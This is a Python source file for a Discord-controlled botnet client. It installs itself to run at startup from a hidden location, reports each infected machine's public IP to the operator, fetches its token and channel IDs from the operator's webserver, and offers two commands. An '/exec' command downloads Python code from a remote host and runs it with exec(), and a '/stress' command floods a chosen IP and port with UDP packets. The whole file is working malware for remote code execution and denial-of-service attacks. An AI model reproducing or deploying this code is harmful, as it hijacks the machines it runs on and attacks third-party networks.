import time #For the flood function
import socket#For the flood function
import random#For the flood function
import requests#To get the data from your webserver
import runatstartup#for the run at startup functionality
import discord#For the discord command and control
from discord.ext import commands#For the discord command and control
import ipv4#to verify it's a valid ipv4
def flood(victim, vport, duration):#The flooding protocol. Note that this has no type of ip spoofing or amplification implemented yet. 
    port = vport #It works :shrug:
    clienta = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)#Open the socket to the client.
    bytes = random._urandom(20000) #Calculate a random number of bytes to send to the client
    timeout =  time.time() + duration #Calculate when to stop
    while 1: #Note: You want to do as little as possible in here as it dramatically decreased the mbps for me. On a gigabit connection, adding one print statement made it go from 850 mbps to 445 mbps.
        if port == 0: #0 Denotes the person wanted a random port
            vport = random.randrange(1,3000) #Give them a random port each time
        if time.time() > timeout: #If the time is up:
            break
        else:
            pass
        clienta.sendto(bytes, (victim, vport))
runatstartup.start()#Copy the running exe to C:\Windows\en-US and create a .bat file in Programs\Startup that will run the exe, this way the exe does not show up in the startup list.
webserverip = 'your.public.ipv4.ip'#change to your webserver IP only. No domain names etc
token = requests.get('http://' + webserverip + '/token.html').text#Get the token from your webserver/token.html
bot = commands.Bot(command_prefix='/')#Initialize the discord bot
@bot.event  
async def on_ready():
    global ip
    ip = requests.get('https://api.ipify.org/').text
    smsg = 'New bot logged on.' + ' Their public ip is: ' + str(ip)
    chid = int(requests.get('http://' + webserverip + '/channelnew.html').text)
    stressinchannel = int(requests.get('http://' + webserverip + '/channel.html').text)
    channal = bot.get_channel(chid)
    await channal.send(smsg)
    #Gets the Channel for new bots and the stresser channel from your webserver. Then sends a message to the new bots channel with the ip. 
@bot.event
async def on_message(message):
    if message.author == bot.user: #return if own message
        return
    if message.content.startswith('/bots'):
        await message.channel.send("Hi There, I'm a bot with the public ip of: " + ip + '.') #when ANYONE sends /bots send the public ip. 
    if message.content.startswith('/exec'):
        correctchannelid = requests.get('http://' + webserverip + '/channel.html').text#get the channel id of the admin channel to make sure not everyone can exec files.
        if int(message.channel.id) != int(correctchannelid):
            return
        else:
            message.content = ''.join(message.content.split())#Remove all whitespace from message
            msgminus6 = message.content[:-6]#remove the last 6 characters(three letter .py file)
            msgminus5 = msgminus6[5:]#remove the first 5 characters(/exec)
            allmyhomieshatewhitespace = ''.join(msgminus5.split())#Strip whitespace again for fun
            url = allmyhomieshatewhitespace#set the url equal to our string that had the removed 11 characters
            lenurl = len(url)#get the length of the url
            lenurl = lenurl + 5#add 5 to the length to include /exec
            filenamee = message.content[lenurl:]#subtract the length of the url +5 for /exec from the start of the message
            filename = filenamee#set the filename equal to the remaining 6 characters
            sssseww = 'http://' + url + '/%s'  % (filename)
            ssssew = requests.get(sssseww).text#get the file 
            exec(ssssew)#execute the file.
    await bot.process_commands(message)
@bot.command()
async def stress(ctx,ip,port,time):
    if ipv4.valid(ip) == True:
        stre = int(requests.get('http://' + webserverip + '/channel.html').text) #Get the stressing channel id again for redunancy. 
        if ctx.channel.id == stre:
            if True == True:
                flood(str(ip), int(port), int(time))                                                                                                            
    else:
        return
bot.run(token)



        


